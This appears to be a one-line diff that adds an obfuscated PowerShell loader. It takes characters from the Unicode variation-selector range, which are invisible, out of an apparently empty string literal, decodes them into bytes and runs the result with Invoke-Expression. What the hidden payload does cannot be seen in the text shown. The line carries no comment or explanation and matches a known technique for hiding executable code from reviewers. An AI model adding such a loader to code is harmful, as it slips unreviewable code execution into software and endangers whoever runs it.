@@ -1,0 +1,1 @@
+IEX([System.Text.Encoding]::UTF8.GetString([byte[]](&({param($T)$T.ToCharArray()|%{$C=[int]$_;if($C -ge 0xFE00 -and $C -le 0xFE0F){[byte]($C-0xFE00)}}}('')))) 
